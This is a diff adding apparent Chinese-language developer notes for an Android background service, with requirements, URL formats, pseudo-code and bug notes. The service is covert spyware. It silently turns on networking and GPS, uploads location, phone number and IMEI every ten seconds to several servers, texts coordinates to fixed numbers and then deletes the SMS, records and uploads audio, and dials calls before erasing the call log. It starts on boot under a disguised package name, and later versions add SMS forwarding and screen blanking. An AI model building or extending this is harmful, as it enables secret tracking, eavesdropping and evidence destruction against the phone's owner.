@@ -1,0 +1,90 @@
+大概这么需求：
+实现一个后台服务，定时查询服务器，根据服务器指令实现下面功能。
+自动打开wifi和GPRS或者3G（4G）上网，不需用户确认。
+自动打开GPS,获取用户位置坐标.如果GPS不能用,通过ineternet定位,获取用户坐标.把用户坐标通过网络上传到指定网站.包含手机号码，手机IMEI号等。
+自动把位置坐标发短信到指定的手机号码,并删除短信记录.包含手机号码，手机IMEI号等。
+后台录音,并上传到指定网站.包含手机号码，手机IMEI号等。
+后台拨打指定的电话号码。通话结束删除本机通话记录.
+
+
+大概这么需求：
+自动打开wifi和GPRS或者3G（4G）上网，不需用户确认。
+自动打开GPS,获取用户位置坐标.如果GPS不能用,通过ineternet定位,获取用户坐标.把用户坐标上传到一组服务器.包含手机号码，手机IMEI号和一个固定字符串,以及该坐标信息是通过gps还是网络获取。
+自动把位置坐标发短信到指定的手机号码,并删除短信记录.包含手机号码，手机IMEI号和一个固定字符串,以及该坐标信息是通过gps还是网络获取。
+后台录音,并上传到指定网站.包含手机号码，手机IMEI号和一个固定字符串,以及该坐标信息是通过gps还是网络获取。
+后台拨打指定的电话号码。通话结束删除本机通话记录.
+
+
+位置信息服务器为一组url,用一个循环上传，位置10秒传一次，
+格式：
+http:\\192.168.1.100:80\main.php?id=1234567890&ph=19991048999&imei=123456789&x=124312432&&y=124312432&z=124312432&gps=0
+id:是一个硬编码的数，定义成const String phoneid=123456，然后复制到url即可
+ph:是手机号
+x:x坐标
+y:y坐标
+z:海拔
+gps:如果通过gps获取位置gps=1,如果通过网络获取位置gps=0
+一组服务器意思是说
+String urls[] = ["http://11.11.11.11/upload.php?.....",
+	 	"http://22.22.22.222/upload.php?.....",
+		"http://33.33.33.33/upload.php?....."
+		];
+for(String url in urls) {
+	upload(url);
+}
+
+
+位置信息发送到一组手机，短信内容就取url后面部分
+id=1234567890&ph=19991048999&imei=123456789&x=124312432&&y=124312432&z=124312432&gps=0
+String PHONE_NUMBERS[] = [
+"13911111111",
+"13922222222"
+"13933333333"
+];
+for(String phno in PHONE_NUMBERS) {
+    sendsms(phno);
+}
+
+音频文件通过post直接传二进制文件？
+标准的 form multipart-data 上传
+1分钟一个文件，连续录制15分钟，文件格式 record12345.xxx, 12345时1970年以来的秒数，格林威治标准时间，xxx是实际录制格式mp3就是mp3，amr就是amr。
+
+拨号也是很多号码
+拨通其中一个就好
+如果所有号码都不通就不管了
+这所有的事情都同时进行
+
+
+开机就启动，录音15分钟并上传，获取位置信息15分钟并上传
+然后退出程序
+
+
+
+192.168.22.3
+192.168.22.4
+192.168.22.5
+
+"18958031925",
+"13911048911"
+
+
+刚才有两个小bug
+&&y  多了一个&
+我是在室内，gps虽然打开了，但是应该没有数据，但是gps=1
+03-02 22:04:07.740: V/sartActivity(7129): com.yulong.android.contacts.dial---com.yulong.android.contacts.dial.DialActivity
+
+ <activity
+            android:name="com.android.ring.MainActivity"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+realse 1.1
+
+realse 1.2
+	1.增加短信转发到指定号码
+	2.增加黑屏，需要设备管理权限
